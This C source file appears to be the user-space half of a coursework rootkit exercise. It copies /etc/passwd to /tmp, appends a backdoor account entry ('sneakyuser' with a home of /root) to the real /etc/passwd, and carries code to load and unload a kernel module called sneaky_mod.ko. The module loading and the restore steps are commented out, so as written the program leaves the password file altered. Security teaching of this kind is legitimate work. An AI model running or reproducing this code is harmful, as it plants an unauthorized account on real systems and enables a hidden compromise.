#include <stdlib.h>
#include <stdio.h>
#include <sys/types.h>
#include <unistd.h>
#include <string.h>
#include <sys/wait.h>


char * line = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
char * etc = "/etc/passwd";
char * temp = "/tmp/passwd";
pid_t pid;



void unload_module(){

  pid_t unload_pid = fork();
  if(unload_pid < 0){
    perror("fork error for unloading module process");
    exit(EXIT_FAILURE);
  }
  else if( unload_pid == 0){
    
     char * argv[3] = {"rmmod","sneaky_mod.ko", NULL};
     int value = execvp("rmmod", argv);
     if(value == -1){
      perror( "execution error the module un-loading process");
      exit(EXIT_FAILURE);
    }
     printf("Removing module\n");
  }

  else {

    int wait_status;
    do {
      pid_t wait_pid = waitpid(unload_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }

}


void load_module(){

  pid_t parent_process = pid; 
  pid_t load_pid = fork();
  
  if(load_pid < 0){
    perror("fork error for loading module process");
    exit(EXIT_FAILURE);
  }
  
  else if( load_pid == 0){

    char module_arg[50];
    snprintf(module_arg,sizeof(module_arg), "parent_id = %d\n", parent_process);
    char * argv[4] = {"insmod", "sneaky_mod.ko", module_arg, NULL};

    int value = execvp("insmod", argv);
    if(value  == -1){
      perror( "execution error the module loading process");
      exit(EXIT_FAILURE);
    }
    printf("Uploading module for exploit\n");

  }

  else{

    // printf("waiting\n");
    int wait_status;
    do {
      pid_t wait_pid = waitpid(load_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
	}

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }

}


void copy_file(char * src,  char * destination){


  //char * command = "cp";
  char * argv[4] = {"cp", src, destination, NULL};
  pid_t copy_pid = fork();

  if(copy_pid < 0){
    perror("fork error for copying process");
    exit(EXIT_FAILURE);
  }
  else if(copy_pid == 0){
    if(execvp(argv[0], argv) < 0){
      perror( "execution error for copy process");
      exit(EXIT_FAILURE);
    }
  }
  else{

    // printf("copy wait");
    int wait_status;
    do {
      pid_t wait_pid = waitpid(copy_pid, &wait_status, WUNTRACED | WCONTINUED);
      if(wait_pid < 0){
	perror("waitpid error");
        exit(EXIT_FAILURE);
      }

    } while (!WIFEXITED(wait_status) && !WIFSIGNALED(wait_status));
    
  }

}


void add_sneaky_line (char * filename){

    FILE * file;
    file = fopen(filename, "a"); //open file in append mode
    if(file == NULL) {
    perror("Error opening the password file.");
  }
  else{
    fputs(line, file);
    fclose(file);
   }
}


void loop(){

  int char_eq;
  char_eq = getchar();
  while(char_eq != 'q'){
    char_eq = getchar();
  }

}



int main(){

  //Print process PID
  pid = getpid();
  printf("sneaky_process pid = %d\n", pid);

  //First malicious act. Copy /etc/passwd file to a new file: /tmp/passwd
  copy_file(etc, temp);

  //Add the line
  add_sneaky_line(etc);
  
  //Load the sneaky module using the insmod command
  //  load_module();

  //Enter a loop when the module is being uploaded
  // loop();

  //Exit from the loop suggests removing the module using rmmod
  // unload_module();

  //Restore the original file
  // copy_file(temp, etc);

  //Delete the content of tmp file
  // fopen(temp, "w");
  
}
